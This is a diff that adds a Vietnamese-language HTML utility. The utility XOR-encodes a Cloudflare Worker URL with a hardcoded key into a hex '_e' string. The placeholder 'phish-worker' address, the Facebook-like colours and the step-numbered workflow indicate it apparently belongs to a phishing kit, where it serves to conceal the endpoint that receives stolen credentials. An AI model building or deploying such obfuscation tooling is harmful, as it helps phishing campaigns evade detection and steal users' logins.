@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Encode Worker URL</title>
+<style>
+  body{font-family:system-ui,sans-serif;max-width:600px;margin:40px auto;padding:20px}
+  label{display:block;margin:12px 0 4px;font-weight:600}
+  input,textarea{width:100%;padding:10px;font-size:14px;border:1px solid #ccc;border-radius:6px;box-sizing:border-box;font-family:monospace}
+  button{padding:10px 24px;font-size:15px;margin-top:12px;cursor:pointer;border-radius:6px;border:none;background:#1877F2;color:#fff}
+  button:hover{background:#166fe5}
+  .result{margin-top:16px;padding:12px;background:#f0f2f5;border-radius:6px;word-break:break-all;font-family:monospace;font-size:13px}
+  .copy-btn{margin-top:8px;background:#42b72a;font-size:13px;padding:6px 16px}
+  .copy-btn:hover{background:#36a420}
+</style></head>
+<body>
+<h2>Encode Worker URL → chuỗi _e</h2>
+
+<label>URL Worker mới (copy từ bước 6):</label>
+<input type="text" id="url" placeholder="https://phish-worker.tenban.workers.dev">
+
+<button onclick="encode()">Encode</button>
+
+<div class="result" id="result" style="display:none">
+  <strong>Chuỗi _e:</strong>
+  <div id="output"></div>
+  <button class="copy-btn" onclick="copy()">Copy</button>
+</div>
+
+<script>
+var KEY='xK9#mP2$vL7@qR4';
+function encode(){
+  var url=document.getElementById('url').value.trim();
+  if(!url){alert('Dán URL worker vào trước');return}
+  var enc='';
+  for(var i=0;i<url.length;i++){
+    var h=(url.charCodeAt(i)^KEY.charCodeAt(i%KEY.length)).toString(16);
+    enc+=h.length===1?'0'+h:h;
+  }
+  document.getElementById('output').textContent=enc;
+  document.getElementById('result').style.display='block';
+}
+function copy(){
+  var t=document.getElementById('output').textContent;
+  navigator.clipboard.writeText(t).then(function(){alert('Đã copy!')});
+}
+</script>
+</body></html>
